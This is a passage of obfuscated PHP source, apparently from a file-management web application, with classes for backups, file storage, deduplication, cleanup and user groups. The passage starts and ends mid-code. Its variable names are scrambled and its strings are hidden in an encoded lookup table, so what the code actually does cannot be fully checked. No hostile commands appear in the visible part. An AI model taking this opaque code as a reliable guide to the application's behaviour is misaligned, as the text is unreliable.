$¢¡ó£äú[$_SERVER[´‹ô¯Œ][448]] : array(); foreach ($Ç˜öˆÁ as $ëâ¸û») { if (!$this->_fileExist($ëâ¸û», $ş¼¾îÂ¿, $ªØŠÑÄ¢)) { Backup::log($_SERVER[´‹ô¯Œ][907] . $ëâ¸û»[$_SERVER[´‹ô¯Œ][555]] . $_SERVER[´‹ô¯Œ][908] . $ëâ¸û»[$_SERVER[´‹ô¯Œ][87]]); continue; } $ßŠ¬³¹ = $ëâ¸û»[$_SERVER[´‹ô¯Œ][87]]; $®æ“Ìã = "\173\x69\157\x3a{$ìãº£ò[$_SERVER[´‹ô¯Œ][838]]}\x7d" . substr($ßŠ¬³¹, strlen("\173\151\x6f\x3a{$ëâ¸û»[$_SERVER[´‹ô¯Œ][909]]}\x7d")); if (IO::exist($®æ“Ìã)) { $â™Ìƒ„©->updateFileEnd($ëâ¸û»[$_SERVER[´‹ô¯Œ][32]], $ëâ¸û»[$_SERVER[´‹ô¯Œ][79]]); } else { $®æ“Ìã = get_path_father($®æ“Ìã); IO::mkdir($®æ“Ìã); if (!IO::copy($ßŠ¬³¹, $®æ“Ìã, $_SERVER[´‹ô¯Œ][910])) { Backup::log($_SERVER[´‹ô¯Œ][911] . $ßŠ¬³¹ . $_SERVER[´‹ô¯Œ][893] . $®æ“Ìã . $_SERVER[´‹ô¯Œ][178]); $ÚÉò¥“¹ = !1; break; } } $—ù­şôñ = $ëâ¸û»[$_SERVER[´‹ô¯Œ][555]]; $êú·ıı  += 1; $ğ»¡ßÅ® += $ëâ¸û»[$_SERVER[´‹ô¯Œ][79]]; $»±‘Øë += 1; $ŞÁ¿”Ç› += $ëâ¸û»[$_SERVER[´‹ô¯Œ][79]]; if ($ğ»¡ßÅ® >= 1024 * 1024 * 100) { $ÁñŒçŞå = array($_SERVER[´‹ô¯Œ][837] => $—ù­şôñ, $_SERVER[´‹ô¯Œ][912] => $»±‘Øë, $_SERVER[´‹ô¯Œ][913] => $ŞÁ¿”Ç›); Backup::set($ÁñŒçŞå); $ğ»¡ßÅ® = $êú·ıı  = 0; } } $£ùæá = count($Ç˜öˆÁ); $Şª‚¢ƒ++; } while ($£ùæá == $ÜôËÕÌØ); $â™Ìƒ„©->end(); $ÁñŒçŞå = array($_SERVER[´‹ô¯Œ][914] => 1, $_SERVER[´‹ô¯Œ][847] => time(), $_SERVER[´‹ô¯Œ][861] => 1, $_SERVER[´‹ô¯Œ][837] => $—ù­şôñ, $_SERVER[´‹ô¯Œ][915] => time()); if ($êú·ıı ) { $ÁñŒçŞå[$_SERVER[´‹ô¯Œ][912]] = $»±‘Øë; $ÁñŒçŞå[$_SERVER[´‹ô¯Œ][913]] = $ŞÁ¿”Ç›; } Backup::set($ÁñŒçŞå); return !0; } private function _fileExist($‡ÒÌ¼Ö©, &$ñÁì­üî, $«‹ú’íõ) { $ÃÇî®ˆ =& $_SERVER[´‹ô¯Œ]; $İñÕŠ¹Ğ = $‡ÒÌ¼Ö©[$ÃÇî®ˆ[87]]; if (in_array($‡ÒÌ¼Ö©[$ÃÇî®ˆ[555]], $ñÁì­üî)) { return !1; } if (!in_array($‡ÒÌ¼Ö©[$ÃÇî®ˆ[909]], $«‹ú’íõ)) { return !1; } if (IO::exist($İñÕŠ¹Ğ)) { return !0; } $Ä€İ¬¹ñ = get_path_father($İñÕŠ¹Ğ); if (IO::exist($Ä€İ¬¹ñ)) { $ñÁì­üî[] = $‡ÒÌ¼Ö©[$ÃÇî®ˆ[555]]; return !1; } $ÍÌÔñÕİ = array($ÃÇî®ˆ[909] => $‡ÒÌ¼Ö©[$ÃÇî®ˆ[909]], $ÃÇî®ˆ[87] => array($ÃÇî®ˆ[462], "{$Ä€İ¬¹ñ}\45")); $†Ş—Œ› = Model($ÃÇî®ˆ[877])->where($ÍÌÔñÕİ)->field($ÃÇî®ˆ[556])->select(); $ñÁì­üî = array_merge($ñÁì­üî, array_to_keyvalue($†Ş—Œ›, $ÃÇî®ˆ[12], $ÃÇî®ˆ[555])); return !1; } private function _fileFilter($Â›šé×¼) { $¯Ÿƒ¡ß =& $_SERVER[´‹ô¯Œ]; return; if (empty($Â›šé×¼)) { return; } $ÔµôÍ™ñ = array($¯Ÿƒ¡ß[555] => array($¯Ÿƒ¡ß[7], array_unique($Â›šé×¼))); $İıÛ†Ø = Model($¯Ÿƒ¡ß[916])->where($ÔµôÍ™ñ)->field($¯Ÿƒ¡ß[194])->select(); foreach ($İıÛ†Ø as $©›ÛôÉÄ) { Model($¯Ÿƒ¡ß[916])->remove($©›ÛôÉÄ[$¯Ÿƒ¡ß[194]], !1); } } private function storeIds() { $ç­•€ö› =& $_SERVER[´‹ô¯Œ]; $óéşë À = Model($ç­•€ö›[853])->listData(); $ìÉœ¿× = array(); $óÙñ…ö‹ = $GLOBALS[$ç­•€ö›[6]][$ç­•€ö›[92]][$ç­•€ö›[917]]; foreach ($óéşë À as $¥İ‘†û ) { $£¡™†ä² = strtolower($¥İ‘†û [$ç­•€ö›[98]]); if (!isset($óÙñ…ö‹[$£¡™†ä²])) { continue; } $ÆîëŞØô = $ç­•€ö›[77] . (isset($óÙñ…ö‹[$£¡™†ä²]) ? $óÙñ…ö‹[$£¡™†ä²] : ucfirst($£¡™†ä²)); if (!class_exists($ÆîëŞØô)) { continue; } $ìÉœ¿×[] = $¥İ‘†û [$ç­•€ö›[487]]; } return $ìÉœ¿×; } } goto f½ÕñÎë¨; e³ŠÈ¤´Ñ: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\145\x5f\x63\x6f\156\x74\145\x6e\164\163"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\x65\162\x74", "\x66\165\156\143\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\x65" => "\x69\157\137\x66\x69\x6c\x65\x5f\155\x65\164\141", "\155\145\164\x61\x46\151\x65\x6c\144" => "\x66\151\x6c\x65\111\x44"); public function fileInfo($ÔòÎ¥ˆÜ) { $×åˆ¯Æƒ =& $_SERVER[´‹ô¯Œ]; static $ŠìÆŒğ = array(); if (!isset($ŠìÆŒğ[$ÔòÎ¥ˆÜ])) { $ëîüèÄ« = $×åˆ¯Æƒ[2046]; $Û‚ˆ—‹‘ = Model($×åˆ¯Æƒ[558])->field($ëîüèÄ«)->where(array($×åˆ¯Æƒ[556] => $ÔòÎ¥ˆÜ))->find(); $ŠìÆŒğ[$ÔòÎ¥ˆÜ] = $Û‚ˆ—‹‘; } return $ŠìÆŒğ[$ÔòÎ¥ˆÜ]; } public function addFileByContent($À´­ı¡º = '', $ÔáÌ‡“Ğ, $ö³Ø¾İ = '') { $îãŸŒ±› =& $_SERVER[´‹ô¯Œ]; $Ü¶ëôó— = TEMP_PATH . $îãŸŒ±›[2047]; if (!is_dir($Ü¶ëôó—)) { mk_dir($Ü¶ëôó—); } $©Âïª–Ç = $Ü¶ëôó— . $îãŸŒ±›[2048] . rand_string(16); $‰¢äÈ›€ = file_put_contents($©Âïª–Ç, $À´­ı¡º); if ($‰¢äÈ›€ === !1 || strlen($À´­ı¡º) != $‰¢äÈ›€) { return !1; } $³šÀÃŞä = $this->addFile($©Âïª–Ç, $ÔáÌ‡“Ğ, $ö³Ø¾İ, !0); if (file_exists($©Âïª–Ç)) { @unlink($©Âïª–Ç); } return $³šÀÃŞä; } public function createFileName($ùÌ˜ˆïı, $ÍË»¾‹¨, $¢°™¦û = false, $¹Äï” = false) { $§ÀØ»‡ =& $_SERVER[´‹ô¯Œ]; $Ú¹Îöˆ = IO::init($§ÀØ»‡[8]); $¢â˜ÂÓº = $this->_makeFilePath($ùÌ˜ˆïı, $ÍË»¾‹¨, $Ú¹Îöˆ, $¢°™¦û, $¹Äï”); $Ÿ›ŒÑçÊ = $Ú¹Îöˆ->pathFather($¢â˜ÂÓº); static $×Ç´‡×Ä = false; $˜”ÙìÜ± = $§ÀØ»‡[2049] . md5($Ÿ›ŒÑçÊ); if (!$×Ç´‡×Ä && !Cache::get($˜”ÙìÜ±)) { $×Ç´‡×Ä = !0; $½æÄä–½ = IO::mkdir($Ÿ›ŒÑçÊ); if (!IO::exist($½æÄä–½ . $§ÀØ»‡[885])) { IO::mkfile($½æÄä–½ . $§ÀØ»‡[885]); } Cache::set($˜”ÙìÜ±, 1, 3600 * 2); } return $¢â˜ÂÓº; } public function _makeFilePath($Š³ÉÅ„·, $øšìãù, $­ªğ¡Ëû, $Ö“ÈÇÖ = false, $Şİ­…à = false) { $–ĞèÛÇ™ =& $_SERVER[´‹ô¯Œ]; $ì¢§§ş” = Model($–ĞèÛÇ™[856])->get($–ĞèÛÇ™[2050]); $¡Êûã©Ù = $–ĞèÛÇ™[1339] . $øšìãù[$–ĞèÛÇ™[487]] . $–ĞèÛÇ™[496] . date($–ĞèÛÇ™[2051]); $úš±ëµÛ = $¡Êûã©Ù . rand_string(5) . short_id(100); $Š³ÉÅ„· = str_replace($–ĞèÛÇ™[8], $–ĞèÛÇ™[11], KodIO::clear($Š³ÉÅ„·)); $èèÌ¯ñÆ = $­ªğ¡Ëû->ext($Š³ÉÅ„·); if (!$Š³ÉÅ„·) { $ì¢§§ş” = $–ĞèÛÇ™[862]; } switch ($ì¢§§ş”) { case $–ĞèÛÇ™[2052]: if ($èèÌ¯ñÆ) { $úš±ëµÛ = $úš±ëµÛ . $–ĞèÛÇ™[10] . $èèÌ¯ñÆ; } if ($èèÌ¯ñÆ == $–ĞèÛÇ™[1989]) { $úš±ëµÛ .= $–ĞèÛÇ™[1308]; } break; case $–ĞèÛÇ™[2053]: $Ò‡ÛËªÌ = Model($–ĞèÛÇ™[856])->get($–ĞèÛÇ™[857]); $¢ùì¾‘§ = substr(md5($–ĞèÛÇ™[858] . $Ò‡ÛËªÌ . date($–ĞèÛÇ™[835])), 0, 8); $¡Êûã©Ù = $–ĞèÛÇ™[1339] . $øšìãù[$–ĞèÛÇ™[487]] . $–ĞèÛÇ™[496] . date($–ĞèÛÇ™[2054]) . $¢ùì¾‘§ . $–ĞèÛÇ™[8]; if ($èèÌ¯ñÆ == $–ĞèÛÇ™[1989]) { $Š³ÉÅ„· .= $–ĞèÛÇ™[1308]; } $ÆŒı€×ô = $–ĞèÛÇ™[2055] . $¡Êûã©Ù . $Š³ÉÅ„·; CacheLock::lock($ÆŒı€×ô); $úš±ëµÛ = $¡Êûã©Ù . $Š³ÉÅ„·; if (IO::exist($¡Êûã©Ù . $Š³ÉÅ„·)) { $ÂÖ¨ÖÛ¢ = substr($Š³ÉÅ„·, 0, strlen($Š³ÉÅ„·) - strlen($èèÌ¯ñÆ)); $æùô§˜Ä = $Şİ­…à ? substr($Şİ­…à, 0, 5) : ($Ö“ÈÇÖ ? substr($Ö“ÈÇÖ, 0, 5) : rand_string(5)); $úš±ëµÛ = $¡Êûã©Ù . $ÂÖ¨ÖÛ¢ . $æùô§˜Ä; if ($èèÌ¯ñÆ) { $úš±ëµÛ = $úš±ëµÛ . $–ĞèÛÇ™[10] . $èèÌ¯ñÆ; } } if (IO::isOsDriver($úš±ëµÛ) && !IO::isUploadServer($úš±ëµÛ)) { if (IO::exist($úš±ëµÛ)) { CacheLock::unlock($ÆŒı€×ô); return $úš±ëµÛ; } $ÂÅœı = IO::setContent($úš±ëµÛ, $–ĞèÛÇ™[12]); if (!$ÂÅœı) { show_json($–ĞèÛÇ™[2056], !1); } } CacheLock::unlock($ÆŒı€×ô); break; case $–ĞèÛÇ™[862]: break; default: break; } return $úš±ëµÛ; } public function addFileByRemote($Å·´…ô¼, $ƒµ¸¥Ëñ, $òÓ“Š· = array()) { $åù¾¬Ï =& $_SERVER[´‹ô¯Œ]; if (!IO::exist($Å·´…ô¼)) { return !1; } $ìå¡˜ƒ = $òÓ“Š·[$åù¾¬Ï[561]] ? $òÓ“Š·[$åù¾¬Ï[561]] : $åù¾¬Ï[12]; $½‰şºî¢ = IO::hashMd5($Å·´…ô¼, $ìå¡˜ƒ); $¸İµø²ş = KodIO::parse($Å·´…ô¼); $‚©Ï˜àè = array($åù¾¬Ï[634] => IO::size($Å·´…ô¼), $åù¾¬Ï[2057] => 1, $åù¾¬Ï[506] => $ƒµ¸¥Ëñ, $åù¾¬Ï[899] => $¸İµø²ş[$åù¾¬Ï[487]], $åù¾¬Ï[507] => $Å·´…ô¼, $åù¾¬Ï[2058] => $òÓ“Š·[$åù¾¬Ï[689]] ? $òÓ“Š·[$åù¾¬Ï[689]] : IO::hashSimple($Å·´…ô¼), $åù¾¬Ï[2059] => $½‰şºî¢ ? $½‰şºî¢ : $ìå¡˜ƒ); if ($ÆşÓ„îş = $this->addFileCheckExist($‚©Ï˜àè[$åù¾¬Ï[689]], $‚©Ï˜àè[$åù¾¬Ï[561]], $‚©Ï˜àè[$åù¾¬Ï[79]])) { return $ÆşÓ„îş; } return $this->addFileData($‚©Ï˜àè); } private function addFileData($†èÊäÒ§) { $­ğ†ÖãĞ =& $_SERVER[´‹ô¯Œ]; if (!$†èÊäÒ§) { return !1; } $†èÊäÒ§[$­ğ†ÖãĞ[79]] = intval($†èÊäÒ§[$­ğ†ÖãĞ[79]]); if (!$†èÊäÒ§[$­ğ†ÖãĞ[79]] && strlen($†èÊäÒ§[$­ğ†ÖãĞ[689]]) > 32) { $†èÊäÒ§[$­ğ†ÖãĞ[79]] = intval(substr($†èÊäÒ§[$­ğ†ÖãĞ[689]], 32)); } $ƒ´±ñ¶ü = $this->add($†èÊäÒ§); return $this->find($ƒ´±ñ¶ü); } public function addFile($‚¶«œëÊ, $–¤äË÷É, $İ©¢‘Ûà, $ÕŒ¨‚ãŠ = false) { $—Ğ¹ß’Á =& $_SERVER[´‹ô¯Œ]; $øÈ×÷­­ = IO::hashSimple($‚¶«œëÊ); $…Á¶ÑËÖ = IO::size($‚¶«œëÊ); $¦Îƒ¼Ê = $…Á¶ÑËÖ <= 1024 * 1024 * 10 ? IO::hashMd5($‚¶«œëÊ) : $—Ğ¹ß’Á[12]; $¯°·•À– = $—Ğ¹ß’Á[2060] . $øÈ×÷­­; CacheLock::lock($¯°·•À–); if ($¦Îƒ¼Ê && $øÈ×÷­­) { $“êæ•ÜÖ = $this->addFileCheckExist($øÈ×÷­­, $¦Îƒ¼Ê, $…Á¶ÑËÖ); if ($“êæ•ÜÖ) { CacheLock::unlock($¯°·•À–); return $“êæ•ÜÖ; } } $ÒÌ™Š£™ = $this->addFileMake($‚¶«œëÊ, $–¤äË÷É, $…Á¶ÑËÖ, $øÈ×÷­­, $¦Îƒ¼Ê, $İ©¢‘Ûà, $ÕŒ¨‚ãŠ); $¸îú¸ûÓ = $this->addFileData($ÒÌ™Š£™); if (!$¸îú¸ûÓ) { return !1; } CacheLock::unlock($¯°·•À–); if (!$¦Îƒ¼Ê && $¸îú¸ûÓ) { $this->fileMd5Check($¸îú¸ûÓ); } return $¸îú¸ûÓ; } public function fileMd5Check($¥È„Ø°) { $ÀøÕÍ¿Û =& $_SERVER[´‹ô¯Œ]; $”“×ŞÂ™ = array($¥È„Ø°[$ÀøÕÍ¿Û[555]], $¥È„Ø°[$ÀøÕÍ¿Û[87]]); $ñÙÓÄÁä = $ÀøÕÍ¿Û[2061] . $¥È„Ø°[$ÀøÕÍ¿Û[87]]; $€ø¿ëÂ» = $ÀøÕÍ¿Û[2062] . $¥È„Ø°[$ÀøÕÍ¿Û[555]]; TaskQueue::add($ÀøÕÍ¿Û[2063], $”“×ŞÂ™, $ñÙÓÄÁä, $€ø¿ëÂ»); } public function fileMd5Set($°ºŒÊªÕ, $±ƒòæŞ‹) { $Ö¼«şŞ =& $_SERVER[´‹ô¯Œ]; $÷ÆÙìÜ = $this->find($°ºŒÊªÕ); if (!$÷ÆÙìÜ || $÷ÆÙìÜ[$Ö¼«şŞ[561]]) { return; } $¢¦çŞâû = IO::hashMd5($±ƒòæŞ‹); if (!$¢¦çŞâû) { return $Ö¼«şŞ[12]; } $this->where(array($Ö¼«şŞ[555] => $°ºŒÊªÕ))->save(array($Ö¼«şŞ[561] => $¢¦çŞâû)); } public function addFileMake($¯Ÿ¼İ¿µ, $”ÔíÅôÃ, $çÄ ­ù½, $—³ÔÙĞé, $İ¡şÚ‹‘, $µ†¥—ô‘, $üƒñ¿) { $è˜ıóşù =& $_SERVER[´‹ô¯Œ]; $À¬úÎè = $this->createFileName($µ†¥—ô‘, $”ÔíÅôÃ, $—³ÔÙĞé, $İ¡şÚ‹‘); $˜Ğ’†¢Œ = get_path_father($À¬úÎè); $µ×ô‡öÖ = get_path_this($À¬úÎè); if ($üƒñ¿) { $¾ÊÖ¥šå = IO::move($¯Ÿ¼İ¿µ, $˜Ğ’†¢Œ, !1, $µ×ô‡öÖ); } else { $¾ÊÖ¥šå = IO::copy($¯Ÿ¼İ¿µ, $˜Ğ’†¢Œ, !1, $µ×ô‡öÖ); } if (!$¾ÊÖ¥šå) { return !1; } $—˜ó’×¯ = IO::init($¾ÊÖ¥šå); $—˜ó’×¯->cacheMethod($è˜ıóşù[182], $—˜ó’×¯->path, $è˜ıóşù[179]); if (IO::size($¾ÊÖ¥šå) != $çÄ ­ù½) { return !1; } $„Äï±ıû = array($è˜ıóşù[634] => $çÄ ­ù½, $è˜ıóşù[2057] => 1, $è˜ıóşù[506] => $µ†¥—ô‘, $è˜ıóşù[899] => $”ÔíÅôÃ[$è˜ıóşù[487]], $è˜ıóşù[507] => $À¬úÎè, $è˜ıóşù[2058] => $—³ÔÙĞé, $è˜ıóşù[2059] => $İ¡şÚ‹‘); return $„Äï±ıû; } public function addFileCheckExist($£úı‚™ƒ, $‘‹¿¥ü, $À·ë¬Ãˆ) { $ĞÚƒ¨˜ =& $_SERVER[´‹ô¯Œ]; $®‘©Œè = $this->findByHash($£úı‚™ƒ, $‘‹¿¥ü); if (!$®‘©Œè) { return !1; } $»ºµóŞô = array($ĞÚƒ¨˜[2057] => intval($®‘©Œè[$ĞÚƒ¨˜[2064]]) + 1, $ĞÚƒ¨˜[634] => $À·ë¬Ãˆ); $this->where(array($ĞÚƒ¨˜[556] => $®‘©Œè[$ĞÚƒ¨˜[555]]))->save($»ºµóŞô); return $®‘©Œè; } public function remove($à†åíá—) { $this->linkCountChange($à†åíá—, !1); $this->clearEmpty(); return !0; } public function linkAdd($€ƒ¨¯ÉØ) { $this->linkCountChange($€ƒ¨¯ÉØ, !0); } public function linkCountChange($‹åŞÖ£, $ÖÃ’Ğ¼Û) { $à°ãò±¥ =& $_SERVER[´‹ô¯Œ]; if (!$‹åŞÖ£) { return; } if (!is_array($‹åŞÖ£)) { $‹åŞÖ£ = array($‹åŞÖ£); } $»Úéóø = array(); foreach ($‹åŞÖ£ as $ïØ‘Òî) { $æëıÉ°ß = $ïØ‘Òî . $à°ãò±¥[12]; if (!$»Úéóø[$æëıÉ°ß]) { $»Úéóø[$æëıÉ°ß] = 0; } $»Úéóø[$æëıÉ°ß]++; } $şÂÊ„—¢ = array(); foreach ($»Úéóø as $ïØ‘Òî => $‡ãŒıÔª) { $æëıÉ°ß = $‡ãŒıÔª . $à°ãò±¥[12]; if (!$şÂÊ„—¢[$æëıÉ°ß]) { $şÂÊ„—¢[$æëıÉ°ß] = array(); } $şÂÊ„—¢[$æëıÉ°ß][] = $ïØ‘Òî; } foreach ($şÂÊ„—¢ as $‡ãŒıÔª => $¶âşØ´ó) { if (!$¶âşØ´ó) { continue; } $‡ãŒıÔª = $ÖÃ’Ğ¼Û ? $‡ãŒıÔª : -intval($‡ãŒıÔª); $Ëˆâô°“ = array($à°ãò±¥[555] => array($à°ãò±¥[7], $¶âşØ´ó)); if ($‡ãŒıÔª < 0) { $Ëˆâô°“[$à°ãò±¥[2064]] = array($à°ãò±¥[1107], abs($‡ãŒıÔª)); } $this->where($Ëˆâô°“)->setAdd($à°ãò±¥[2064], $‡ãŒıÔª); } } public function findByHash($… “éÖÒ, $ô…¬¬º‚ = false) { $©ãÀ“å =& $_SERVER[´‹ô¯Œ]; if (!$… “éÖÒ && !$ô…¬¬º‚) { return !1; } $ÆÆ¹â² = array($©ãÀ“å[2058] => $… “éÖÒ); if ($ô…¬¬º‚) { $ÆÆ¹â² = array($©ãÀ“å[2059] => $ô…¬¬º‚); } return $this->order($©ãÀ“å[2065])->where($ÆÆ¹â²)->find(); } public function clearEmpty($¦ıÄ¡¯ = 1) { $³¾áìµ‚ =& $_SERVER[´‹ô¯Œ]; $à«øğÔ™ = time() - 3600 * 24 * $¦ıÄ¡¯; $ÚäƒËâ± = $³¾áìµ‚[2066] . $à«øğÔ™; $””ïÂ“ = $this->where($ÚäƒËâ±)->select(); if (!$””ïÂ“) { return; } $†–å“÷Ï = new Task($³¾áìµ‚[2067], $³¾áìµ‚[12], count($””ïÂ“)); foreach ($””ïÂ“ as $íğÌ‡æ) { $†–å“÷Ï->update(1); $this->resetFile($íğÌ‡æ); } $†–å“÷Ï->end(); } public function resetFile($Úè‡Ò¢) { $àç©ÈÀõ =& $_SERVER[´‹ô¯Œ]; $ŸÓÀíåî = array($àç©ÈÀõ[556] => $Úè‡Ò¢[$àç©ÈÀõ[555]]); $¨í¼ïÈ§ = Model($àç©ÈÀõ[1445])->where($ŸÓÀíåî)->count(); $®ïÑÔàÁ = Model($àç©ÈÀõ[2068])->where($ŸÓÀíåî)->count(); $˜Á¡µ›î = intval($¨í¼ïÈ§) + intval($®ïÑÔàÁ); if ($˜Á¡µ›î == 0) { IO::remove($Úè‡Ò¢[$àç©ÈÀõ[87]]); Model($àç©ÈÀõ[2069])->delete($Úè‡Ò¢[$àç©ÈÀõ[555]]); $this->where($ŸÓÀíåî)->delete(); $this->metaSet($Úè‡Ò¢[$àç©ÈÀõ[555]], null, null); write_log(ACTION . $àç©ÈÀõ[2070] . KodUser::id() . $àç©ÈÀõ[2071] . $Úè‡Ò¢[$àç©ÈÀõ[555]] . $àç©ÈÀõ[2072] . $Úè‡Ò¢[$àç©ÈÀõ[79]] . $àç©ÈÀõ[202] . $Úè‡Ò¢[$àç©ÈÀõ[87]], $àç©ÈÀõ[2073]); return; } if ($Úè‡Ò¢[$àç©ÈÀõ[2064]] != $˜Á¡µ›î) { $this->where($ŸÓÀíåî)->save(array($àç©ÈÀõ[2057] => $˜Á¡µ›î)); } } public function storageInfo($¹”íü×‡ = false) { $Üñ”æ×´ =& $_SERVER[´‹ô¯Œ]; $ÒŠâŸø = $this->count() + 0.0; $ªÙ›Œ½ß = 0; $³Ú±ëö™ = 1; $õàÊ§¤  = 0; $„±…Ìúç = 5000; for ($ëÍ…ûÖö = 0; $ëÍ…ûÖö < $ÒŠâŸø; $ëÍ…ûÖö = $ëÍ…ûÖö + $„±…Ìúç) { $Š˜š«ğ« = $this->limit($ëÍ…ûÖö, $ëÍ…ûÖö + $„±…Ìúç)->select(); foreach ($Š˜š«ğ« as $“ªáª ­) { $³Ú±ëö™ += $“ªáª ­[$Üñ”æ×´[79]] * $“ªáª ­[$Üñ”æ×´[2064]]; $ªÙ›Œ½ß += $“ªáª ­[$Üñ”æ×´[79]] * ($“ªáª ­[$Üñ”æ×´[2064]] - 1); $õàÊ§¤  += $“ªáª ­[$Üñ”æ×´[2064]]; } } $Í»× ô = array($Üñ”æ×´[2074] => $³Ú±ëö™, $Üñ”æ×´[2075] => $ªÙ›Œ½ß, $Üñ”æ×´[2076] => $ªÙ›Œ½ß / $³Ú±ëö™, $Üñ”æ×´[83] => $ÒŠâŸø, $Üñ”æ×´[2077] => $õàÊ§¤ ); return $Í»× ô; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\155\145" => "\147\162\157\165\160\x5f\155\145\x74\x61", "\155\145\x74\x61\x46\151\x65\x6c\144" => "\147\162\157\x75\160\x49\104"); protected function cacheFunctionAlias($Çè÷Ô) { $ĞŸÛ Æû =& $_SERVER[´‹ô¯Œ]; return array($ĞŸÛ Æû[2078] => array($Çè÷Ô[0], $ĞŸÛ Æû[2079]), $ĞŸÛ Æû[2080] => array($Çè÷Ô[0], $ĞŸÛ Æû[2081])); } protected function getInfo($ëğêúÌÉ, $”²âËê¬ = false) { $‘¼Áç’® = $this->getInfoSimple($ëğêúÌÉ); if (!$‘¼Áç’®) { return !1; } if ($”²âËê¬) { return $this->_listDataApplyItem($‘¼Áç’®); } return $this->cacheFunctionGet($_SERVER[´‹ô¯Œ][2082], $ëğêúÌÉ); } protected function getInfoSimple($êõ¸Ñµ², $âÖ¯·õ = false) { $Œ›µ«Æ =& $_SERVER[´‹ô¯Œ]; if ($âÖ¯·õ) { $”šàÎÓ = array($Œ›µ«Æ[1407] => intval($êõ¸Ñµ²)); $ÄÇ­Ë» = $this->where($”šàÎÓ)->find(); return is_array($ÄÇ­Ë») ? $ÄÇ­Ë» : array(); } return $this->cacheFunctionGet($Œ›µ«Æ[2083], $êõ¸Ñµ²); } protected function groupAdd($å©ÍË·) { $ãÓ¶Ş¹¬ =& $_SERVER[´‹ô¯Œ]; if (!$å©ÍË·[$ãÓ¶Ş¹¬[193]] && isset($å©ÍË·[$ãÓ¶Ş¹¬[1407]]) && $å©ÍË·[$ãÓ¶Ş¹¬[1407]] == 1) { if ($§Ÿıöçü = $this->getInfoSimple($å©ÍË·[$ãÓ¶Ş¹¬[1407]], !0)) { return $å©ÍË·[$ãÓ¶Ş¹¬[1407]]; } } else { $§Ÿıöçü = $this->getInfoSimple($å©ÍË·[$ãÓ¶Ş¹¬[193]]); if (!$§Ÿıöçü) { return !1; } } $“”äæ“¬ = $ãÓ¶Ş¹¬[607]; if ($§Ÿıöçü[$ãÓ¶Ş¹¬[598]]) { $“”äæ“¬ = $§Ÿıöçü[$ãÓ¶Ş¹¬[598]] . $§Ÿıöçü[$ãÓ¶Ş¹¬[1407]] . $ãÓ¶Ş¹¬[50]; } $ÂòñÂ = array($ãÓ¶Ş¹¬[506] => $this->groupNameAuto($å©ÍË·[$ãÓ¶Ş¹¬[193]], $å©ÍË·[$ãÓ¶Ş¹¬[32]]), $ãÓ¶Ş¹¬[489] => $å©ÍË·[$ãÓ¶Ş¹¬[193]], $ãÓ¶Ş¹¬[669] => $“”äæ“¬, $ãÓ¶Ş¹¬[2084] => $å©ÍË·[$ãÓ¶Ş¹¬[1983]], $ãÓ¶Ş¹¬[2085] => 0, $ãÓ¶Ş¹¬[2000] => 0); $å©ÍË·[$ãÓ¶Ş¹¬[32]] = $ÂòñÂ[$ãÓ¶Ş¹¬[32]]; if (isset($å©ÍË·[$ãÓ¶Ş¹¬[2020]])) { $ÂòñÂ[$ãÓ¶Ş¹¬[2020]] = $å©ÍË·[$ãÓ¶Ş¹¬[2020]]; } else { $ğÑ¾ŸÜĞ = $this->max($ãÓ¶Ş¹¬[2020]); if (!$ğÑ¾ŸÜĞ) { $ğÑ¾ŸÜĞ = 0; } $ÂòñÂ[$ãÓ¶Ş¹¬[2020]] = $ğÑ¾ŸÜĞ + 1; } if (!empty($å©ÍË·[$ãÓ¶Ş¹¬[1407]])) { $ÂòñÂ[$ãÓ¶Ş¹¬[1407]] = $å©ÍË·[$ãÓ¶Ş¹¬[1407]]; } $Ò„„Ò« = $this->add($ÂòñÂ); $this->groupMetaEdit($Ò„„Ò«, $å©ÍË·); Model($ãÓ¶Ş¹¬[1445])->groupRootAdd($Ò„„Ò«); $this->_clearCache($å©ÍË·[$ãÓ¶Ş¹¬[193]]); return $Ò„„Ò«; } protected function groupEdit($ÜâŸ¤úÒ, $à½¢Á§—) { $¾·Åíş² =& $_SERVER[´‹ô¯Œ]; $—ÊˆğÎ = $this->getInfoSimple($ÜâŸ¤úÒ); if (!$—ÊˆğÎ) { return !1; } if (!empty($à½¢Á§—[$¾·Åíş²[193]])) { $õâê½øº = $this->getInfoSimple($à½¢Á§—[$¾·Åíş²[193]]); if (!$õâê½øº) { return !1; } if ($—ÊˆğÎ[$¾·Åíş²[1407]] == $õâê½øº[$¾·Åíş²[1407]]) { return !1; } if ($à½¢Á§—[$¾·Åíş²[193]] != $—ÊˆğÎ[$¾·Åíş²[193]]) { if ($õâê½øº[$¾·Åíş²[598]] !== $—ÊˆğÎ[$¾·Åíş²[598]] && strpos($õâê½øº[$¾·Åíş²[598]], $—ÊˆğÎ[$¾·Åíş²[598]] . $—ÊˆğÎ[$¾·Åíş²[1407]] . $¾·Åíş²[50]) === 0) { return !1; } $à½¢Á§—[$¾·Åíş²[669]] = $õâê½øº[$¾·Åíş²[598]] . $à½¢Á§—[$¾·Åíş²[193]] . $¾·Åíş²[50]; $this->_changeChildLevel($—ÊˆğÎ, $õâê½øº); $this->_clearCache($õâê½øº[$¾·Åíş²[1407]]); $this->_clearCache($—ÊˆğÎ[$¾·Åíş²[193]]); } } $this->groupMetaEdit($ÜâŸ¤úÒ, $à½¢Á§—); $this->_clearChildrenCache($—ÊˆğÎ); return $this->where(array($¾·Åíş²[2086] => $ÜâŸ¤úÒ))->save($à½¢Á§—); } private function groupMetaEdit($€†Û×Û¢, &$ã”§‚ÁÀ) { $ØıÄ á =& $_SERVER[´‹ô¯Œ]; if (isset($ã”§‚ÁÀ[$ØıÄ á[32]])) { $this->setNamePinyin($€†Û×Û¢, $ã”§‚ÁÀ[$ØıÄ á[32]]); } if (isset($ã”§‚ÁÀ[$ØıÄ á[2087]])) { $ÍËŞ×ÒÑ = array($ØıÄ á[2087] => $ã”§‚ÁÀ[$ØıÄ á[2087]], $ØıÄ á[2088] => $ã”§‚ÁÀ[$ØıÄ á[2088]]); unset($ã”§‚ÁÀ[$ØıÄ á[2087]]); unset($ã”§‚ÁÀ[$ØıÄ á[2088]]); if 